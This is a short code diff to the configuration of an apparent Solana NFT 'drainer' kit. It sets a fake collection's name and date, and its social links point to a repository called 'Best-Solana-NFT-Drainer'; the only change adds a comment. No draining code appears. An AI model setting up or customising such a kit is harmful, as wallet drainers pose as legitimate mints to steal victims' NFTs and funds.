@@ -1,7 +1,7 @@
 const collectionInfo = {
     name: "Yeah Tigers | 0x32Moon", // Name of the collection
     title: "{name}", 
-    date: "30.06.2022",
+    date: "30.06.2022", // Today Date
     socialMedia: {
         discord: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Discord link
         twitter: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Twitter link
